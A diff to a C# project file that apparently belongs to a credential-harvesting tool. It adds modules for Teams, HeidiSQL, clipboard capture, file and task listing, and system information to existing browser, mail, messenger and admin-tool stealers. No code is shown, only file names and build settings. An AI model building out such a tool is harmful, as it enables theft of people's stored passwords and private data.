@@ -22,6 +22,7 @@
     <DefineConstants>TRACE;DEBUG</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -31,8 +32,10 @@
     <DefineConstants>TRACE</DefineConstants>
     <ErrorReport>prompt</ErrorReport>
     <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
     <Reference Include="System" />
     <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
@@ -55,8 +58,12 @@
     <Compile Include="Browsers\Chrome.cs" />
     <Compile Include="Helper\Bcrypt.cs" />
     <Compile Include="Helper\Blowfish.cs" />
+    <Compile Include="Helper\ICommandOnce.cs" />
     <Compile Include="Helper\decryptMoz3DES.cs" />
+    <Compile Include="Helper\ICommand.cs" />
+    <Compile Include="Helper\JavaRng.cs" />
     <Compile Include="Helper\Navicat11Cipher.cs" />
+    <Compile Include="Helper\NtfsReader.cs" />
     <Compile Include="Helper\Pixini.cs" />
     <Compile Include="Helper\LockedFile.cs" />
     <Compile Include="Helper\Methods.cs" />
@@ -65,8 +72,10 @@
     <Compile Include="Helper\Native.cs" />
     <Compile Include="Helper\Pbkdf2.cs" />
     <Compile Include="Helper\RC4Crypt.cs" />
+    <Compile Include="Helper\Shortcut.cs" />
     <Compile Include="Helper\TripleDESHelper.cs" />
     <Compile Include="Helper\ZipStorer.cs" />
+    <Compile Include="IMEs\Win10Ms_Pinyin.cs" />
     <Compile Include="Mails\Foxmail.cs" />
     <Compile Include="Mails\MailBird.cs" />
     <Compile Include="Mails\MailMaster.cs" />
@@ -77,9 +86,15 @@
     <Compile Include="Messengers\Line.cs" />
     <Compile Include="Messengers\QQ.cs" />
     <Compile Include="Messengers\Skype.cs" />
+    <Compile Include="Messengers\Teams.cs" />
     <Compile Include="Messengers\Telegram.cs" />
+    <Compile Include="SystemInfos\ClipBoard.cs" />
+    <Compile Include="SystemInfos\FileList.cs" />
     <Compile Include="SystemInfos\InstalledApp.cs" />
+    <Compile Include="SystemInfos\RecentFile.cs" />
     <Compile Include="SystemInfos\ScreenShot.cs" />
+    <Compile Include="SystemInfos\SystemInfo.cs" />
+    <Compile Include="SystemInfos\TaskList.cs" />
     <Compile Include="SystemInfos\Wifi.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
@@ -87,6 +102,7 @@
     <Compile Include="Softwares\NeteaseCloudMusic.cs" />
     <Compile Include="Tools\DBeaver.cs" />
     <Compile Include="Tools\FinalShell.cs" />
+    <Compile Include="Tools\HeidiSQL.cs" />
     <Compile Include="Tools\MobaXterm.cs" />
     <Compile Include="Tools\Navicat.cs" />
     <Compile Include="Tools\RDCMan.cs" />
